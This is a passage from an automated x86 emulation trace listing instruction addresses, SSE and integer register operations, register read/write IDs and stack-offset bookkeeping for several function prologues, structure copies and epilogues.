for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423653: movaps xmm0, xmmword ptr [ebp - 0x460], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 0x42365a: movaps xmmword ptr [ebp - 0x420], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x423661: movaps xmmword ptr [ebp - 0x430], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x423670: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x42367b: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x423686: movaps xmm0, xmmword ptr [ebp - 0x440], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7bc0 for stack size 0x10000 0x42368d: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423691: movaps xmm7, xmm6, regs_read: [128], regs_write: [129] 0x42369d: pxor xmm7, xmm2, regs_read: [129, 124], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4236a1: movaps xmm2, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x4236b9: movaps xmmword ptr [ebp - 0x440], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bc0 for stack size 0x10000 saving data to stack: 0 16 0x4236c0: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x4236d3: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x4236d6: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4236ea: movaps xmm1, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x4236f9: movaps xmmword ptr [ebp - 0x420], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x423700: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423711: movaps xmm0, xmmword ptr [ebp - 0x440], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7bc0 for stack size 0x10000 0x423718: movaps xmm4, xmm5, regs_read: [127], regs_write: [126] 0x42372b: movaps xmmword ptr [ebp - 0x430], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x42373e: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423746: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x423749: pxor xmm7, xmm3, regs_read: [129, 125], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423751: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x42375d: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x423766: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x42377a: pxor xmm1, xmm7, regs_read: [123, 129], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x42377e: movaps xmm7, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x42378f: movaps xmm0, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x4237d7: pxor xmm0, xmmword ptr [eax - 0x10], regs_read: [122, 19], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7ff0 for stack size 0x10000 0x423f9f: push eax, regs_read: [30, 19], regs_write: [30] 0x423fa3: push eax, regs_read: [30, 19], regs_write: [30] 0x423fa4: push ebx, regs_read: [30, 21], regs_write: [30] 0x423faa: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 0x423fb2: pop edi, regs_read: [30], regs_write: [30, 23] 0x423fb3: pop esi, regs_read: [30], regs_write: [30, 29] 0x423fb4: pop ebx, regs_read: [30], regs_write: [30, 21] 0x423fba: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x423fbc: pop ebp, regs_read: [30], regs_write: [30, 20] 0x423fc0: push ebp, regs_read: [30, 20], regs_write: [30] 0x423fc1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x423fc6: mov ecx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x423fc9: mov edx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x423fcc: push ebx, regs_read: [30, 21], regs_write: [30] 0x423fcd: push esi, regs_read: [30, 29], regs_write: [30] 0x423fce: push edi, regs_read: [30, 23], regs_write: [30] 0x423fcf: mov eax, dword ptr [edx + 4], regs_read: [24], regs_write: [19] 0x423fd5: mov ebx, dword ptr [edx + 0x18], regs_read: [24], regs_write: [21] 0x423fd8: mov edi, dword ptr [edx + 0x1c], regs_read: [24], regs_write: [23] 0x423fdb: mov esi, dword ptr [edx + 0x20], regs_read: [24], regs_write: [29] 0x423fe7: mov dword ptr [ebp + 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x423fea: mov eax, dword ptr [edx + 8], regs_read: [24], regs_write: [19] 0x423ff0: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x423ff3: mov eax, dword ptr [edx + 0xc], regs_read: [24], regs_write: [19] 0x423ff9: mov dword ptr [ebp - 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x423ffc: mov eax, dword ptr [edx + 0x10], regs_read: [24], regs_write: [19] 0x424002: mov dword ptr [ebp - 0xc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x424005: mov eax, dword ptr [edx + 0x14], regs_read: [24], regs_write: [19] 0x42400b: mov edx, dword ptr [edx + 0x24], regs_read: [24], regs_write: [24] 0x424011: mov dword ptr [ebp - 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x424014: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x424017: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x42401b: mov ecx, dword ptr [ebp + 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x8008 for stack size 0x10000 0x42401e: mov dword ptr [ecx], eax, regs_read: [22, 19], regs_write: () 0x424020: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x8010 for stack size 0x10000 0x424023: mov dword ptr [ecx + 4], eax, regs_read: [22, 19], regs_write: () 0x424026: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 0x424029: mov dword ptr [ecx + 8], eax, regs_read: [22, 19], regs_write: () 0x42402c: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 0x42402f: mov dword ptr [ecx + 0xc], eax, regs_read: [22, 19], regs_write: () 0x424032: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x424035: mov dword ptr [ecx + 0x1c], edi, regs_read: [22, 23], regs_write: () 0x424038: pop edi, regs_read: [30], regs_write: [30, 23] 0x424039: mov dword ptr [ecx + 0x20], esi, regs_read: [22, 29], regs_write: () 0x42403c: mov dword ptr [ecx + 0x10], eax, regs_read: [22, 19], regs_write: () 0x42403f: mov eax, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x7ff0 for stack size 0x10000 0x424042: pop esi, regs_read: [30], regs_write: [30, 29] 0x424043: mov dword ptr [ecx + 0x18], ebx, regs_read: [22, 21], regs_write: () 0x424046: mov dword ptr [ecx + 0x14], eax, regs_read: [22, 19], regs_write: () 0x424049: mov dword ptr [ecx + 0x24], edx, regs_read: [22, 24], regs_write: () 0x42404c: pop ebx, regs_read: [30], regs_write: [30, 21] 0x42404d: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x42404f: pop ebp, regs_read: [30], regs_write: [30, 20] 0x424060: push ebp, regs_read: [30, 20], regs_write: [30] 0x424061: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x424066: mov ecx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x42406b: mov dword ptr [ebp + 0x10], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x42406e: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x424071: push ebx, regs_read: [30, 21], regs_write: [30] 0x424072: push esi, regs_read: [30, 29], regs_write: [30] 0x424073: push edi, regs_read: [30, 23], regs_write: [30] 0x424074: mov edx, dword ptr [ecx + 4], regs_read: [22], regs_write: [24] 0x424077: mov eax, dword ptr [ecx], regs_read: [22], regs_write: [19] 0x424079: mov ebx, dword ptr [ecx + 8], regs_read: [22], regs_write: [21] 0x42407c: mov esi, dword ptr [ecx + 0xc], regs_read: [22], regs_write: [29] 0x42407f: mov edi, dword ptr [ecx + 0x10], regs_read: [22], regs_write: [23] 0x424082: mov ecx, dword ptr [ecx + 0x14], regs_read: [22], regs_write: [22] 0x424085: mov dword ptr [ebp - 0x1c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe4 for stack size 0x10000 saving data to stack: 0 4 0x424088: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x42408b: mov dword ptr [ebp - 0x30], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 4 0x42408e: mov dword ptr [ebp - 0x34], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 saving data to stack: 0 4 0x424091: mov dword ptr [ebp - 0x38], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc8 for stack size 0x10000 saving data to stack: 0 4 0x424094: mov ecx, dword ptr [ecx + 0x18], regs_read: [22], regs_write: [22] 0x424097: mov dword ptr [ebp - 0x20], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 4 0x42409a: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x42409d: mov dword ptr [ebp - 0x3c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 saving data to stack: 0 4 0x4240a0: mov dword ptr [ebp - 0x40], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 4 0x4240a3: mov ecx, dword ptr [ecx + 0x1c], regs_read: [22], regs_write: [22] 0x4240a6: mov dword ptr [ebp - 0x24], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 saving data to stack: 0 4 0x4240a9: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x4240ac: mov ecx, dword ptr [ecx + 0x20], regs_read: [22], regs_write: [22] 0x4240af: mov dword ptr [ebp - 0x28], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd8 for stack size 0x10000 saving data to stack: 0 4 0x4240b2: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x4240b5: mov ecx, dword ptr [ecx + 0x24], regs_read: [22], regs_write: [22] 0x4240b8: mov dword ptr [ebp - 0x2c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd4 for stack size 0x10000 saving data to stack: 0 4 0x4240bb: mov ecx, dword ptr [ebp + 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x8008 for stack size 0x10000 0x4240c0: mov ecx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x8010 for stack size 0x10000 0x4240c5: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x4240c8: mov eax, edx, regs_read: [24], regs_write: [19] 0x4240ca: mov edx, dword ptr [ebp + 8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x8008 for stack size 0x10000 0x4240e1: mov dword ptr [ebp - 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x4240e4: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x8008 for stack size 0x10000 0x4240e7: mov dword ptr [ebp - 0xc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x4240ea: mov ebx, dword ptr [ebp - 0x1c], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x7fe4 for stack size 0x10000 0x4240f0: mov dword ptr [ebp - 0x10], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x4240f5: mov esi, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x4240fb: mov dword ptr [ebp - 0x14], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 saving data to stack: 0 4 0x424100: mov edi, dword ptr [ebp - 0x20], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x424106: mov edx, dword ptr [ebp - 0x28], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fd8 for stack size 0x10000 0x424110: mov dword ptr [ebp - 0x18], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe8 for stack size 0x10000 saving data to stack: 0 4 0x424113: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x8008 for stack size 0x10000 0x424116: mov ecx, dword ptr [ebp - 0x2c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fd4 for stack size 0x10000 0x42411c: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 0x424121: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 0x424127: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x42412d: mov eax, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x424133: mov eax, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x424139: mov eax, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fe8 for stack size 0x10000 0x424142: mov eax, edi, regs_read: [23], regs_write: [19] 0x424147: mov eax, esi, regs_read: [29], regs_write: [19] 0x42414c: mov eax, edx, regs_read: [24], regs_write: [19] 0x424151: mov eax, ecx, regs_read: [22], regs_write: [19] 0x424156: mov ebx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x424159: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 0x424162: mov dword ptr [ebx], eax, regs_read: [21, 19], regs_write: () 0x424164: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 0x424170: mov dword ptr [ebx + 4], eax, regs_read: [21, 19], regs_write: () 0x424173: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x424179: mov dword ptr [ebx + 8], eax, regs_read: [21, 19], regs_write: () 0x42417c: mov eax, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x424182: mov dword ptr [ebx + 0xc], eax, regs_read: [21, 19], regs_write: () 0x424185: mov eax, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x42418b: mov dword ptr [ebx + 0x10], eax, regs_read: [21, 19], regs_write: () 0x42418e: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x424191: mov ebx, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x7fe8 for stack size 0x10000 0x42419a: mov dword ptr [eax + 0x18], edi, regs_read: [19, 23], regs_write: () 0x42419d: pop edi, regs_read: [30], regs_write: [30, 23] 0x42419e: mov dword ptr [eax + 0x1c], esi, regs_read: [19, 29], regs_write: () 0x4241a1: pop esi, regs_read: [30], regs_write: [30, 29] 0x4241a2: mov dword ptr [eax + 0x14], ebx, regs_read: [19, 21], regs_write: () 0x4241a5: mov dword ptr [eax + 0x20], edx, regs_read: [19, 24], regs_write: () 0x4241a8: mov dword ptr [eax + 0x24], ecx, regs_read: [19, 22], regs_write: () 0x4241ab: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4241ac: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4241ae: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4241b0: push ebp, regs_read: [30, 20], regs_write: [30] 0x4241b1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4241b9: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x4241bc: push ebx, regs_read: [30, 21], regs_write: [30] 0x4241bd: push esi, regs_read: [30, 29], regs_write: [30] 0x4241be: push edi, regs_read: [30, 23], regs_write: [30] 0x4241bf: mov ecx, dword ptr [eax], regs_read: [19], regs_write: [22] 0x4241c1: mov edx, dword ptr [eax + 0x24], regs_read: [19], regs_write: [24] 0x4241c4: mov dword ptr [ebp - 0x30], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 4 0x4241c7: mov ecx, dword ptr [eax + 4], regs_read: [19], regs_write: [22] 0x4241ca: mov dword ptr [ebp - 0x2c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd4 for stack size 0x10000 saving data to stack: 0 4 0x4241cd: mov ecx, dword ptr [eax + 8], regs_read: [19], regs_write: [22] 0x4241d0: mov dword ptr [ebp - 0x28], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd8 for stack size 0x10000 saving data to stack: 0 4 0x4241d3: mov ecx, dword ptr [eax + 0xc], regs_read: [19], regs_write: [22] 0x4241d6: mov dword ptr [ebp - 0x24], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 saving data to stack: 0 4 0x4241d9: mov ecx, dword ptr [eax + 0x10], regs_read: [19], regs_write: [22] 0x4241dc: mov dword ptr [ebp - 0x20], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 4 0x4241df: mov ecx, dword ptr [eax + 0x14], regs_read: [19], regs_write: [22] 0x4241e2: mov dword ptr [ebp - 0x1c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe4 for stack size 0x10000 saving data to stack: 0 4 0x4241e5: mov ecx, dword ptr [eax + 0x18], regs_read: [19], regs_write: [22] 0x4241e8: mov dword ptr [ebp - 0x18], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe8 for stack size 0x10000 saving data to stack: 0 4 0x4241eb: mov ecx, dword ptr [eax + 0x1c], regs_read: [19], regs_write: [22] 0x4241ee: mov dword ptr [ebp - 0x14], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 saving data to stack: 0 4 0x4241f1: mov ecx, dword ptr [eax + 0x20], regs_read: [19], regs_write: [22] 0x4241f4: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x8010 for stack size 0x10000 0x4241f7: mov dword ptr [ebp - 0x10], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x4241fa: mov dword ptr [ebp - 0x38], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc8 for stack size 0x10000 saving data to stack: 0 4 0x4241fd: mov esi, dword ptr [eax + 0x10], regs_read: [19], regs_write: [29] 0x424200: mov ecx, dword ptr [eax], regs_read: [19], regs_write: [22] 0x424202: mov ebx, dword ptr [eax + 8], regs_read: [19], regs_write: [21] 0x424205: mov edi, dword ptr [eax + 0xc], regs_read: [19], regs_write: [23] 0x424208: mov dword ptr [ebp - 0x5c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 saving data to stack: 0 4 0x42420b: mov esi, dword ptr [eax + 0x14], regs_read: [19], regs_write: [29] 0x42420e: mov dword ptr [ebp - 0x64], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x424211: mov esi, dword ptr [eax + 0x18], regs_read: [19], regs_write: [29] 0x424214: mov dword ptr [ebp - 0xc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x424217: mov ecx, dword ptr [eax + 4], regs_read: [19], regs_write: [22] 0x42421a: mov dword ptr [ebp - 0x6c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x42421d: mov esi, dword ptr [eax + 0x1c], regs_read: [19], regs_write: [29] 0x424220: mov dword ptr [ebp - 0x74], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 saving data to stack: 0 4 0x424223: mov esi, dword ptr [eax + 0x20], regs_read: [19], regs_write: [29] 0x424226: mov eax, dword ptr [eax + 0x24], regs_read: [19], regs_write: [19] 0x424229: mov dword ptr [ebp - 0x8c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f74 for stack size 0x10000 saving data to stack: 0 4 0x424233: mov dword ptr [ebp - 0x84], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7f7c for stack size 0x10000 saving data to stack: 0 4 0x424239: mov dword ptr [ebp - 0x3c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 saving data to stack: 0 4 0x424242: mov dword ptr [ebp - 0x60], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x424249: mov dword ptr [ebp - 0x48], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x42424f: mov dword ptr [ebp - 0x58], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x424256: mov dword ptr [ebp - 0x54], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x42425d: mov dword ptr [ebp - 0x70], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x424260: mov dword ptr [ebp - 0x40], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 4 0x42426a: mov dword ptr [ebp - 0x44], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 saving data to stack: 0 4 0x424274: mov dword ptr [ebp - 0x34], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 saving data to stack: 0 4 0x42427c: mov ecx, edx, regs_read: [24], regs_write: [22] 0x42427e: mov dword ptr [ebp + 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x424281: mov edx, dword ptr [ebp - 0x2c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fd4 for stack size 0x10000 0x42428f: mov dword ptr [ebp - 8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x424292: mov ecx, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x424298: mov ecx, dword ptr [ebp - 0x1c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fe4 for stack size 0x10000 0x4242a1: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 0x4242a6: mov dword ptr [ebp - 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x4242b5: mov edx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x4242c0: mov eax, esi, regs_read: [29], regs_write: [19] 0x4242cb: mov eax, edi, regs_read: [23], regs_write: [19] 0x4242d6: mov eax, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x4242e2: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x4242ee: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x4242fd: mov edx, ecx, regs_read: [22], regs_write: [24] 0x424305: mov dword ptr [ebp + 0xc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 saving data to stack: 0 4 0x424308: mov dword ptr [ebp - 0x50], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x42430b: mov edx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x42431a: mov edx, dword ptr [ebp - 0x38], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fc8 for stack size 0x10000 0x42431d: mov ecx, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 0x42432b: mov edx, dword ptr [ebp - 0x2c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fd4 for stack size 0x10000 0x424339: mov edx, dword ptr [ebp - 